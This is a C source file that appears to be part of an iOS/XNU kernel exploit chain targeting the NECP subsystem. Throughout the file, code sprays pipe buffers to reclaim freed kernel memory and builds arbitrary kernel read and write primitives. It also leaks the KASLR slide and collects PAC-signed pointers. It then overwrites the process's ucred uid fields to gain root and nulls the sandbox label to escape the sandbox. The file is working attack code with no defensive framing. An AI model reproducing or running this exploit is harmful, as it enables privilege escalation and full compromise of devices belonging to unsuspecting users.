#include "exploit.h"
#include "necp.h"
#include <CoreFoundation/CFPreferences.h>
#include <CoreFoundation/CFNumber.h>
#include <sys/mman.h>

extern int nk_necp_open(void) __attribute__((weak));
extern int nk_kaslr_candidate_count(void) __attribute__((weak));
extern uint64_t nk_kaslr_candidate(int i) __attribute__((weak));
extern void nk_mach_leak_hunt(void) __attribute__((weak));
extern void nk_crafted_io_hunt(void) __attribute__((weak));

static int is_kernel_va(uint64_t v);
static int is_poison(uint64_t v);
static int printable_ascii(uint8_t c);

#define DO_PIPE_MAX      512
#define DO_OBJ_SZ        256
#define DO_OUT_SZ        8192
#define DO_MAX_CANDS     128
#define DO_MAX_LEAKS     256
#define PAC_LOG_MAX      12
#define PAC_STORE_MAX    16
#define DO_MAX_REFL      16
#define MARK_A 0x0102030405060708ULL
#define MARK_B 0x090A0B0C0D0E0F10ULL

typedef struct {
    int      valid;
    int      ptr_off;
    int      len_off;
    uint32_t len_val;
    int      uuid_mode;
    int      with_uuid_head;
    uint64_t last_addr;
} do_read_cfg_t;

typedef struct {
    int valid;
    int action;
    int ptr_off;
    int uuid_mode;
} do_write_cfg_t;

static int s_pipes[DO_PIPE_MAX][2];
static int s_pipe_init_done = 0;
static do_read_cfg_t  s_read  = {0};
static do_write_cfg_t s_write = {0};
static uint64_t s_candidates[DO_MAX_CANDS];
static int      s_n_candidates = 0;
static uint64_t s_leaked_ptrs[DO_MAX_LEAKS];
static int      s_n_leaked = 0;
static uint64_t s_signed[PAC_STORE_MAX];
static int      s_n_signed = 0;
static int      s_pac_logs = 0;
static uint8_t  s_best_leak[DO_OUT_SZ];
static size_t   s_best_leak_len = 0;
static uint64_t s_root_ucred = 0;

int nk_pac_signed_count(void) { return s_n_signed; }
uint64_t nk_pac_signed_at(int i) { return (i >= 0 && i < s_n_signed) ? s_signed[i] : 0; }

static int pref_bool(const char *key) {
    CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
    if (!ks) return 0;
    CFTypeRef v = CFPreferencesCopyAppValue(ks, kCFPreferencesCurrentApplication);
    CFRelease(ks);
    if (!v) return 0;
    int on = 0;
    if (CFGetTypeID(v) == CFBooleanGetTypeID())
        on = CFBooleanGetValue((CFBooleanRef)v) ? 1 : 0;
    CFRelease(v);
    return on;
}

static inline uint64_t strip_pac_manual(uint64_t v) {
    uint64_t lo = v & 0x0000FFFFFFFFFFFFULL;
    if (lo & (1ULL << 47)) return lo | 0xFFFF000000000000ULL;
    return lo;
}

static int is_potentially_signed(uint64_t v) {
    if (v == 0) return 0;
    uint16_t top = (uint16_t)(v >> 48);
    if (top == 0x0000 || top == 0xFFFF) return 0;
    uint64_t s = strip_pac_manual(v);
    uint32_t hi = (uint32_t)(s >> 32);
    if (hi != 0xfffffff0 && hi != 0xffffffe0 &&
        hi != 0xfffffe00 && hi != 0xffffff80) return 0;
    if (is_poison(s)) return 0;
    return 1;
}

static void store_signed(uint64_t v) {
    for (int i = 0; i < s_n_signed; i++)
        if (s_signed[i] == v) return;
    if (s_n_signed < PAC_STORE_MAX)
        s_signed[s_n_signed++] = v;
}

static void pipes_init(void) {
    if (s_pipe_init_done) return;
    for (int i = 0; i < DO_PIPE_MAX; i++) {
        s_pipes[i][0] = -1; s_pipes[i][1] = -1;
    }
    s_pipe_init_done = 1;
}

static void pipes_close_all(void) {
    pipes_init();
    for (int i = 0; i < DO_PIPE_MAX; i++) {
        if (s_pipes[i][0] >= 0) close(s_pipes[i][0]);
        if (s_pipes[i][1] >= 0) close(s_pipes[i][1]);
        s_pipes[i][0] = -1; s_pipes[i][1] = -1;
    }
}

static void pipes_close_range(int start, int end) {
    pipes_init();
    if (start < 0) start = 0;
    if (end > DO_PIPE_MAX) end = DO_PIPE_MAX;
    for (int i = start; i < end; i++) {
        if (s_pipes[i][0] >= 0) close(s_pipes[i][0]);
        if (s_pipes[i][1] >= 0) close(s_pipes[i][1]);
        s_pipes[i][0] = -1; s_pipes[i][1] = -1;
    }
}

static int pipes_spray_buf(const uint8_t *buf, size_t sz) {
    pipes_init();
    if (!buf || sz < 16 || sz > 4096) return 0;
    int made = 0;
    for (int i = 0; i < DO_PIPE_MAX; i++) {
        if (s_pipes[i][0] != -1 || s_pipes[i][1] != -1) continue;
        if (pipe(s_pipes[i]) != 0) {
            s_pipes[i][0] = -1; s_pipes[i][1] = -1; continue;
        }
        ssize_t w = write(s_pipes[i][1], buf, sz);
        if (w == (ssize_t)sz) made++;
        else {
            close(s_pipes[i][0]); close(s_pipes[i][1]);
            s_pipes[i][0] = -1; s_pipes[i][1] = -1;
        }
    }
    return made;
}

static void shape_zone(void) {
    static uint8_t benign[DO_OBJ_SZ];
    memset(benign, 0x42, sizeof(benign));
    pipes_close_all();
    pipes_spray_buf(benign, sizeof(benign));
    pipes_close_range(0, 64);
}

typedef struct __attribute__((packed)) {
    uint8_t  out_uuid[16];
    uint8_t  in_uuid[16];
    uint16_t flags;
    uint16_t nexus_count;
    uint32_t pad;
} do_flow_req_t;

static long do_action(int fd, uint32_t action, void *u, size_t ul, void *d, size_t dl) {
    return syscall(SYS_NECP_ACTION, fd, action, u, (uint32_t)ul, d, (uint32_t)dl);
}

static int ensure_necp(void) {
    if (g_fd >= 0) return 0;
    if (nk_necp_open && nk_necp_open() == 0) return 0;
    g_fd = (int)syscall(SYS_NECP_OPEN, 0);
    if (g_fd < 0) { nk_log("[do] necp_open failed errno=%d", errno); return -1; }
    uint8_t params[1] = {0};
    long r = do_action(g_fd, NECP_ADD_CLIENT, g_uuid, 16, params, 1);
    if (r != 0) {
        nk_log("[do] add_client failed errno=%d", errno);
        close(g_fd); g_fd = -1; return -1;
    }
    return 0;
}

static int add_gated_flow(uint8_t flow_out[16], uint16_t flags) {
    do_flow_req_t req;
    memset(&req, 0, sizeof(req));
    memcpy(req.in_uuid, g_uuid, 16);
    req.flags = flags; req.nexus_count = 0;
    long r = do_action(g_fd, NECP_ADD_FLOW, (void *)g_uuid, 16, &req, sizeof(req));
    if (r != 0) return -1;
    uint8_t u[16]; memcpy(u, req.out_uuid, 16);
    int az = 1;
    for (int i = 0; i < 16; i++) if (u[i]) { az = 0; break; }
    if (az) memcpy(u, req.in_uuid, 16);
    if (!(u[GATE_BYTE] & 0x01)) {
        do_action(g_fd, NECP_REMOVE_FLOW, u, 16, NULL, 0); return -1;
    }
    memcpy(flow_out, u, 16);
    return 0;
}

static int remove_gated_flow(const uint8_t flow[16]) {
    uint8_t uu[16]; memcpy(uu, flow, 16);
    uu[GATE_BYTE] |= 0x01;
    long r = do_action(g_fd, NECP_REMOVE_FLOW, uu, 16, NULL, 0);
    return (r == 0) ? 0 : -1;
}

static int is_kernel_va(uint64_t v) {
    uint32_t hi = (uint32_t)(v >> 32);
    return (hi == 0xfffffff0 || hi == 0xffffffe0 ||
            hi == 0xfffffe00 || hi == 0xffffff80);
}

static int is_poison(uint64_t v) {
    if (v == 0) return 1;
    uint8_t b0 = (uint8_t)(v & 0xff);
    int same = 1;
    for (int i = 1; i < 8; i++)
        if (((v >> (8 * i)) & 0xff) != b0) { same = 0; break; }
    if (same) return 1;
    if (v == 0xDEADBEEFDEADBEEFULL) return 1;
    if (v == 0xAAAAAAAAAAAAAAAAULL) return 1;
    if (v == 0x5555555555555555ULL) return 1;
    if (v == 0xCDCDCDCDCDCDCDCDULL) return 1;
    if (v == 0xFDFDFDFDFDFDFDFDULL) return 1;
    if ((v & 0xFFFFFFFFULL) == 0xDEADBEEFULL) return 1;
    return 0;
}

static int printable_ascii(uint8_t c) { return (c >= 0x20 && c <= 0x7e); }

static void add_candidate(uint64_t v) {
    if (!v || s_n_candidates >= DO_MAX_CANDS) return;
    for (int i = 0; i < s_n_candidates; i++)
        if (s_candidates[i] == v) return;
    s_candidates[s_n_candidates++] = v;
}

static void add_leaked_ptr(uint64_t v) {
    if (!v || !is_kernel_va(v) || is_poison(v)) return;
    for (int i = 0; i < s_n_leaked; i++)
        if (s_leaked_ptrs[i] == v) return;
    if (s_n_leaked < DO_MAX_LEAKS)
        s_leaked_ptrs[s_n_leaked++] = v;
}

static void build_candidates(void) {
    s_n_candidates = 0;
    if (g_found_kernel_ptr && g_best_kptr) add_candidate(g_best_kptr);
    if (nk_kaslr_candidate_count && nk_kaslr_candidate) {
        int n = nk_kaslr_candidate_count();
        for (int i = 0; i < n; i++) add_candidate(nk_kaslr_candidate(i));
    }
    static const uint64_t fixed[] = {
        0xffffffe096961600ULL, 0xffffffe04e000000ULL, 0xffffffe000000000ULL,
        0xfffffff008000000ULL, 0xfffffff00c000000ULL, 0xfffffff034000000ULL,
        0xfffffff036000000ULL, 0xfffffff041000000ULL
    };
    for (size_t i = 0; i < sizeof(fixed) / sizeof(fixed[0]); i++) add_candidate(fixed[i]);
    if (g_best_kptr) {
        add_candidate(g_best_kptr & ~0x3fffULL);
        add_candidate(g_best_kptr + 0x4000);
        add_candidate(g_best_kptr - 0x4000);
        add_candidate(g_best_kptr + 0x100000);
    }
    add_candidate(PRE_SLIDE_DATA_CONST);
    add_candidate(PRE_SLIDE_DATA);
    add_candidate(PRE_SLIDE_TEXT_EXEC);
    if (g_nk.slide) {
        add_candidate(PRE_SLIDE_TEXT + g_nk.slide);
        add_candidate(PRE_SLIDE_TEXT_EXEC + g_nk.slide);
        add_candidate(PRE_SLIDE_DATA_CONST + g_nk.slide);
    }
    nk_log("[do] candidates: %d (slide=%s)", s_n_candidates,
           g_nk.slide ? "known" : "unknown");
}

static void collect_leaked_ptrs(const uint8_t *out, size_t n) {
    if (!out || n < 16) return;
    for (size_t off = 0; off + 8 <= n; off += 8) {
        uint64_t v; memcpy(&v, out + off, 8);
        if (is_kernel_va(v) && !is_poison(v)) add_leaked_ptr(v);
    }
}

static int output_score(const uint8_t *out, size_t n, uint64_t cand) {
    if (!out || n < 16) return -1;
    int all_zero = 1, all_cc = 1;
    for (size_t i = 0; i < n; i++) {
        if (out[i] != 0x00) all_zero = 0;
        if (out[i] != 0xCC) all_cc = 0;
    }
    if (all_zero || all_cc) return -1;
    int kp = 0, kp_other = 0;
    for (size_t off = 0; off + 8 <= n; off += 8) {
        uint64_t v; memcpy(&v, out + off, 8);
        if (is_kernel_va(v) && !is_poison(v)) {
            kp++;
            if (v != cand) kp_other++;
        }
    }
    int ascii = 0, run = 0;
    for (size_t i = 0; i < n; i++) {
        if (printable_ascii(out[i])) run++;
        else { if (run >= 6) ascii += run; run = 0; }
    }
    if (run >= 6) ascii += run;
    int score = 0;
    if (kp_other > 0) score += 8 * kp_other;
    else if (kp > 0) score += 2;
    score += ascii / 4;
    if (n >= 256) score += 1;
    if (n >= 1024) score += 1;
    if (n >= 4096) score += 1;
    return score;
}

static void hunt_pac_pointers(const uint8_t *out, size_t n, uint64_t cand) {
    if (!out || n < 16) return;
    for (size_t off = 0; off + 8 <= n; off += 8) {
        uint64_t v; memcpy(&v, out + off, 8);
        if (!is_potentially_signed(v)) continue;
        store_signed(v);
        if (s_pac_logs < PAC_LOG_MAX) {
            s_pac_logs++;
            nk_log("[PAC HUNT] cand=0x%016llx off=0x%zx signed=0x%016llx stripped=0x%016llx",
                   (unsigned long long)cand, off,
                   (unsigned long long)v, (unsigned long long)strip_pac_manual(v));
        }
    }
}

static long copy_with_spray(const uint8_t *payload, size_t sz,
                            int uuid_mode, uint8_t *out, size_t *out_n) {
    uint8_t flow[16];
    if (add_gated_flow(flow, 0x0040) != 0) return -1;
    shape_zone();
    if (remove_gated_flow(flow) != 0) { pipes_close_all(); return -1; }
    pipes_close_all();
    if (payload && pipes_spray_buf(payload, sz) <= 0) return -1;
    memset(out, 0xCC, DO_OUT_SZ);
    long r;
    if (uuid_mode == 0)
        r = do_action(g_fd, NECP_COPY_RESULT, (void *)g_uuid, 16, out, DO_OUT_SZ);
    else
        r = do_action(g_fd, NECP_COPY_RESULT, (void *)flow, 16, out, DO_OUT_SZ);
    pipes_close_all();
    if (r <= 0) return -1;
    *out_n = ((size_t)r > DO_OUT_SZ) ? DO_OUT_SZ : (size_t)r;
    return r;
}

static int diff_bytes(const uint8_t *a, size_t na, const uint8_t *b, size_t nb,
                      int *firsts, int maxf, int *nf) {
    size_t n = (na < nb) ? na : nb;
    int d = 0;
    *nf = 0;
    if (na != nb) d++;
    for (size_t i = 0; i < n; i++) {
        if (a[i] != b[i]) {
            d++;
            if (*nf < maxf) firsts[(*nf)++] = (int)i;
        }
    }
    return d;
}

static void map_reflected_offsets(int *offs_out, int *n_out, int max) {
    static uint8_t benign[DO_OBJ_SZ];
    static uint8_t pat[DO_OBJ_SZ];
    static uint8_t A[DO_OUT_SZ];
    static uint8_t B[DO_OUT_SZ];
    *n_out = 0;
    for (int off = 0; off + 16 <= DO_OBJ_SZ; off += 8) {
        memset(benign, 0x42, sizeof(benign));
        memset(pat,    0x42, sizeof(pat));
        memcpy(pat + off,     &(uint64_t){MARK_A}, 8);
        memcpy(pat + off + 8, &(uint64_t){MARK_B}, 8);
        size_t na = 0, nb = 0;
        if (copy_with_spray(benign, sizeof(benign), 0, A, &na) < 0) continue;
        if (copy_with_spray(pat, sizeof(pat), 0, B, &nb) < 0) continue;
        int firsts[8]; int nf = 0;
        int d = diff_bytes(A, na, B, nb, firsts, 8, &nf);
        if (d > 0) {
            nk_log("[do REFL] off=0x%x diff=%d first_at=0x%x out=%zu",
                   off, d, nf ? firsts[0] : -1, na);
            if (*n_out < max) offs_out[(*n_out)++] = off;
        }
    }
}

static void build_payload(uint8_t buf[DO_OBJ_SZ], uint64_t ptr, int ptr_off,
                          int len_off, uint32_t len_val, int with_uuid_head) {
    memset(buf, 0, DO_OBJ_SZ);
    if (with_uuid_head) memcpy(buf, g_uuid, 16);
    if (ptr_off >= 0 && ptr_off + 8 <= DO_OBJ_SZ) memcpy(buf + ptr_off, &ptr, 8);
    if (len_off >= 0 && len_off + 4 <= DO_OBJ_SZ) memcpy(buf + len_off, &len_val, 4);
    if (len_off >= 0 && len_off + 8 <= DO_OBJ_SZ) {
        uint64_t len64 = len_val;
        memcpy(buf + len_off, &len64, 8);
    }
}

static int slide_valid_local(uint64_t s) {
    return (s > 0 && s < MAX_SLIDE && (s & 0x3FFFULL) == 0);
}

static void derive_base_from_leak(void) {
    if (s_best_leak_len < 16) return;
    uint64_t anchors[] = {
        PRE_SLIDE_TEXT, PRE_SLIDE_TEXT_EXEC,
        PRE_SLIDE_DATA_CONST, PRE_SLIDE_DATA_SPTM, PRE_SLIDE_DATA
    };
    struct { uint64_t slide; int count; } votes[64];
    int n_votes = 0;
    for (size_t off = 0; off + 8 <= s_best_leak_len; off += 8) {
        uint64_t v; memcpy(&v, s_best_leak + off, 8);
        if (!is_kernel_va(v) || is_poison(v)) continue;
        add_leaked_ptr(v);
        for (size_t a = 0; a < sizeof(anchors) / sizeof(anchors[0]); a++) {
            if (v <= anchors[a]) continue;
            uint64_t slide = v - anchors[a];
            if (!slide_valid_local(slide)) continue;
            int found = 0;
            for (int i = 0; i < n_votes; i++) {
                if (votes[i].slide == slide) { votes[i].count++; found = 1; break; }
            }
            if (!found && n_votes < 64) {
                votes[n_votes].slide = slide; votes[n_votes].count = 1; n_votes++;
            }
        }
    }
    uint64_t best_slide = 0; int best_count = 0;
    for (int i = 0; i < n_votes; i++) {
        if (votes[i].count > best_count) {
            best_count = votes[i].count; best_slide = votes[i].slide;
        }
    }
    if (best_count >= 2) {
        if (g_nk.slide && g_nk.slide != best_slide) {
            nk_log("[!] leak slide=0x%llx != panic slide=0x%llx — держим panic",
                   (unsigned long long)best_slide, (unsigned long long)g_nk.slide);
            return;
        }
        g_nk.slide = best_slide;
        g_nk.base  = PRE_SLIDE_TEXT + best_slide;   /* IMAGE BASE */
        nk_log("[do] derived slide=0x%llx base=0x%llx votes=%d",
               (unsigned long long)g_nk.slide, (unsigned long long)g_nk.base, best_count);
    } else {
        nk_log("[do] leak collected, slide votes weak (%d)", best_count);
    }
}

static int discover_read(void) {
    build_candidates();
    if (s_n_candidates == 0) { nk_log("[do] no kernel VA candidates"); return -1; }
    static int refl[DO_MAX_REFL]; int nrefl = 0;
    nk_log("[do] phase 1: differential reflection map");
    map_reflected_offsets(refl, &nrefl, DO_MAX_REFL);
    nk_log("[do] phase 1 done: reflected offsets=%d", nrefl);
    if (nrefl == 0) {
        nk_log("[-] NECP COPY_RESULT independent of reclaimed heap");
        nk_log("[-] data-only NECP vector dead on 23C55");
        s_read.valid = 0;
        return -1;
    }
    nk_log("[do] phase 2: kernel-candidate scoring on reflected offsets");
    static uint8_t tmp_out[DO_OUT_SZ];
    static const uint32_t lens[] = { 0x200, 0x1000 };
    int attempts = 0, max_attempts = 600, best_score = -1;
    do_read_cfg_t best_cfg;
    memset(&best_cfg, 0, sizeof(best_cfg));
    for (int ri = 0; ri < nrefl; ri++) {
        int ptr_off = refl[ri];
        int len_offs[2] = { ptr_off + 8, ptr_off + 16 };
        for (int ci = 0; ci < s_n_candidates; ci++) {
            uint64_t cand = s_candidates[ci];
            for (int li = 0; li < 2; li++) {
                int len_off = len_offs[li];
                if (len_off + 8 > DO_OBJ_SZ) continue;
                for (size_t l = 0; l < sizeof(lens) / sizeof(lens[0]); l++) {
                    for (int uuid_mode = 0; uuid_mode <= 1; uuid_mode++) {
                        if (attempts >= max_attempts) goto done;
                        attempts++;
                        uint8_t payload[DO_OBJ_SZ];
                        build_payload(payload, cand, ptr_off, len_off, lens[l], 0);
                        size_t n = 0;
                        if (copy_with_spray(payload, sizeof(payload), uuid_mode, tmp_out, &n) < 0) continue;
                        int score = output_score(tmp_out, n, cand);
                        hunt_pac_pointers(tmp_out, n, cand);
                        if (score >= 4) collect_leaked_ptrs(tmp_out, n);
                        if (score > best_score) {
                            best_score = score;
                            best_cfg.valid = 1;
                            best_cfg.ptr_off = ptr_off;
                            best_cfg.len_off = len_off;
                            best_cfg.len_val = lens[l];
                            best_cfg.uuid_mode = uuid_mode;
                            best_cfg.with_uuid_head = 0;
                            best_cfg.last_addr = cand;
                            memcpy(s_best_leak, tmp_out, n);
                            s_best_leak_len = n;
                            nk_log("[do READ CAND] cand=0x%016llx ptr_off=0x%x len_off=0x%x len=0x%x uuid=%d score=%d out=%zu",
                                   (unsigned long long)cand, ptr_off, len_off, lens[l], uuid_mode, score, n);
                        }
                        if (score >= 10) { s_read.valid = 1; s_read.last_addr = cand; goto done; }
                    }
                }
            }
        }
    }
done:
    if (best_score >= 4) {
        s_read = best_cfg; s_read.valid = 1; g_nk.has_rw = 1;
        nk_log("[+] read candidate locked: ptr_off=0x%x len_off=0x%x len=0x%x uuid=%d score=%d",
               s_read.ptr_off, s_read.len_off, s_read.len_val, s_read.uuid_mode, best_score);
        derive_base_from_leak();
        return 0;
    }
    s_read.valid = 0;
    nk_log("[-] reflected offsets exist but no kernel content: attempts=%d best=%d", attempts, best_score);
    return -1;
}

int nk_do_kread(uint64_t kaddr, void *out, size_t len) {
    if (!s_read.valid || !out || len == 0) return -1;
    static uint8_t tmp[DO_OUT_SZ]; size_t n = 0;
    uint8_t payload[DO_OBJ_SZ];
    build_payload(payload, kaddr, s_read.ptr_off, s_read.len_off, s_read.len_val, s_read.with_uuid_head);
    if (copy_with_spray(payload, sizeof(payload), s_read.uuid_mode, tmp, &n) < 0) return -1;
    if (n == 0) return -1;
    memset(out, 0, len);
    size_t cplen = (len < n) ? len : n;
    memcpy(out, tmp, cplen);
    s_read.last_addr = kaddr;
    return 0;
}

static int probe_has_pattern(const uint8_t *probe, uint64_t pat) {
    for (int off = 0; off + 8 <= 4096; off += 8) {
        uint64_t v; memcpy(&v, probe + off, 8);
        if (v == pat) return 1;
    }
    return 0;
}

static int discover_kwrite(void) {
    if (!s_read.valid) { nk_log("[do W] write requires read first"); return -1; }
    void *probe = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (probe == MAP_FAILED) { nk_log("[do W] mmap failed"); return -1; }
    uint64_t pat = 0x5752495445443133ULL;
    static const int ptr_offs[] = { 0, 16, 32, 48, 64, 80, 96, 112, 128 };
    for (int action = 0; action < 64; action++) {
        if (action == NECP_REMOVE_CLIENT || action == NECP_REMOVE_FLOW) continue;
        for (size_t oi = 0; oi < sizeof(ptr_offs) / sizeof(ptr_offs[0]); oi++) {
            int ptr_off = ptr_offs[oi];
            memset(probe, 0x5A, 4096);
            uint8_t flow[16];
            if (add_gated_flow(flow, 0x0040) != 0) continue;
            shape_zone();
            if (remove_gated_flow(flow) != 0) { pipes_close_all(); continue; }
            pipes_close_all();
            uint8_t payload[DO_OBJ_SZ];
            build_payload(payload, (uint64_t)(uintptr_t)probe, ptr_off, ptr_off + 8, 64, s_read.with_uuid_head);
            if (pipes_spray_buf(payload, sizeof(payload)) <= 0) { pipes_close_all(); continue; }
            uint64_t in[16]; for (int i = 0; i < 16; i++) in[i] = pat;
            errno = 0;
            long r = do_action(g_fd, (uint32_t)action, (void *)flow, 16, in, sizeof(in));
            int hit = probe_has_pattern((uint8_t *)probe, pat);
            pipes_close_all();
            if (hit) {
                s_write.valid = 1; s_write.action = action; s_write.ptr_off = ptr_off; s_write.uuid_mode = 1;
                g_nk.has_kwrite = 1; g_nk.has_rw = 1;
                nk_log("[+] write primitive: action=0x%02x ptr_off=0x%x r=%ld errno=%d", action, ptr_off, r, errno);
                munmap(probe, 4096);
                return 0;
            }
        }
    }
    munmap(probe, 4096);
    nk_log("[-] write primitive not found");
    return -1;
}

int nk_do_kwrite64(uint64_t target, uint64_t val) {
    if (!s_write.valid) return -1;
    uint8_t flow[16];
    if (add_gated_flow(flow, 0x0040) != 0) return -1;
    shape_zone();
    if (remove_gated_flow(flow) != 0) { pipes_close_all(); return -1; }
    pipes_close_all();
    uint8_t payload[DO_OBJ_SZ];
    build_payload(payload, target, s_write.ptr_off, s_write.ptr_off + 8, 64, s_read.with_uuid_head);
    if (pipes_spray_buf(payload, sizeof(payload)) <= 0) return -1;
    uint64_t in[16]; for (int i = 0; i < 16; i++) in[i] = val;
    long r;
    if (s_write.uuid_mode == 0) r = do_action(g_fd, (uint32_t)s_write.action, (void *)g_uuid, 16, in, sizeof(in));
    else r = do_action(g_fd, (uint32_t)s_write.action, (void *)flow, 16, in, sizeof(in));
    pipes_close_all();
    return (r >= 0) ? 0 : -1;
}

static int do_kwrite32(uint64_t addr, uint32_t val) {
    uint64_t aligned = addr & ~7ULL;
    uint64_t shift = (addr & 7ULL) * 8;
    uint64_t old = 0;
    if (nk_do_kread(aligned, &old, sizeof(old)) != 0) return -1;
    uint64_t mask = ~(0xFFFFFFFFULL << shift);
    uint64_t newv = (old & mask) | ((uint64_t)val << shift);
    return nk_do_kwrite64(aligned, newv);
}

static int find_u32_in_buf(const uint8_t *buf, size_t n, uint32_t needle, int *off_out) {
    for (size_t off = 0; off + 4 <= n; off += 4) {
        uint32_t v; memcpy(&v, buf + off, 4);
        if (v == needle) { *off_out = (int)off; return 0; }
    }
    return -1;
}

static int find_ascii_in_buf(const uint8_t *buf, size_t n, const char *needle) {
    size_t nl = strlen(needle);
    if (nl == 0 || n < nl) return -1;
    for (size_t i = 0; i + nl <= n; i++)
        if (memcmp(buf + i, needle, nl) == 0) return (int)i;
    return -1;
}

static int blind_root(void) {
    if (!s_read.valid || !s_write.valid) { nk_log("[root] gated: need read and write"); return -1; }
    uid_t uid = getuid();
    if (uid == 0) { nk_log("[root] already uid=0"); g_nk.has_root = 1; return 0; }
    if (s_n_leaked == 0) {
        build_candidates();
        for (int i = 0; i < s_n_candidates; i++) add_leaked_ptr(s_candidates[i]);
    }
    nk_log("[root] blind uid search uid=%u leaked=%d", (unsigned)uid, s_n_leaked);
    for (int li = 0; li < s_n_leaked; li++) {
        uint64_t base_ptr = s_leaked_ptrs[li];
        static uint8_t chunk[0x400];
        if (nk_do_kread(base_ptr, chunk, sizeof(chunk)) != 0) continue;
        for (size_t off = 0; off + 8 <= sizeof(chunk); off += 8) {
            uint64_t q; memcpy(&q, chunk + off, 8);
            if (!is_kernel_va(q) || is_poison(q)) continue;
            static uint8_t cred_probe[0x100];
            if (nk_do_kread(q, cred_probe, sizeof(cred_probe)) != 0) continue;
            int uid_off = -1;
            if (find_u32_in_buf(cred_probe, sizeof(cred_probe), (uint32_t)uid, &uid_off) != 0) continue;
            nk_log("[root] ucred candidate @0x%016llx uid_off=0x%x", (unsigned long long)q, uid_off);
            int fail = 0;
            for (int d = 0; d <= 24; d += 4) {
                uint32_t v = 0;
                if ((size_t)(uid_off + d + 4) > sizeof(cred_probe)) break;
                memcpy(&v, cred_probe + uid_off + d, 4);
                if (v == uid || d == 0) {
                    if (do_kwrite32(q + uid_off + d, 0) != 0) { fail = 1; break; }
                }
            }
            if (fail) continue;
            memset(cred_probe, 0, sizeof(cred_probe));
            if (nk_do_kread(q, cred_probe, sizeof(cred_probe)) != 0) continue;
            uint32_t check = 0xFFFFFFFF; memcpy(&check, cred_probe + uid_off, 4);
            if (check == 0) {
                s_root_ucred = q; g_nk.has_root = 1;
                nk_log("[+] ROOT achieved: uid %u -> 0 via ucred @0x%016llx", (unsigned)uid, (unsigned long long)q);
                return 0;
            }
        }
    }
    nk_log("[-] blind root failed");
    return -1;
}

static int sandbox_escape(void) {
    if (!s_root_ucred) { nk_log("[sbx] no ucred anchor"); return -1; }
    if (!pref_bool("unsafe_sandbox_escape")) { nk_log("[sbx] locked"); return -1; }
    static uint8_t cred[0x100];
    if (nk_do_kread(s_root_ucred, cred, sizeof(cred)) != 0) { nk_log("[sbx] re-read ucred failed"); return -1; }
    for (size_t off = 0; off + 8 <= sizeof(cred); off += 8) {
        uint64_t p; memcpy(&p, cred + off, 8);
        if (!is_kernel_va(p) || is_poison(p)) continue;
        static uint8_t target[0x100];
        if (nk_do_kread(p, target, sizeof(target)) != 0) continue;
        int hit = find_ascii_in_buf(target, sizeof(target), "sandbox");
        if (hit < 0) hit = find_ascii_in_buf(target, sizeof(target), "Sandbox");
        if (hit >= 0) {
            nk_log("[sbx] label @0x%016llx via cred+0x%zx", (unsigned long long)p, off);
            if (nk_do_kwrite64(s_root_ucred + off, 0) == 0) {
                nk_log("[+] sbx nulled cred+0x%zx", off);
                return 0;
            }
        }
    }
    nk_log("[-] sbx label not found");
    return -1;
}

void nk_dataonly_necp_chain(void) {
    nk_rule();
    nk_log("[chain] NECP data-only chain v5 (differential oracle)");
    if (!pref_bool("unsafe_necp_dataonly")) { nk_log("[chain] locked"); nk_rule(); return; }
    if (ensure_necp() != 0) { nk_log("[chain] NECP unavailable"); nk_rule(); return; }
    discover_read();
    if (s_read.valid) {
        if (pref_bool("unsafe_do_kwrite")) discover_kwrite();
        else nk_log("[do W] locked");
    }
    if (s_read.valid && s_write.valid) {
        blind_root();
        if (g_nk.has_root) sandbox_escape();
    }
    if (s_n_signed > 0) {
        nk_log("[PAC STORE] %d signed-pointer candidates kept:", s_n_signed);
        for (int i = 0; i < s_n_signed; i++)
            nk_log("[PAC STORE] [%d] 0x%016llx", i, (unsigned long long)s_signed[i]);
    } else {
        nk_log("[PAC STORE] no signed-pointer candidates this pass");
    }
    nk_log("[chain] state: read=%d write=%d root=%d base=0x%llx leaked=%d signed=%d",
           s_read.valid, s_write.valid, g_nk.has_root,
           (unsigned long long)g_nk.base, s_n_leaked, s_n_signed);
    nk_rule();
}
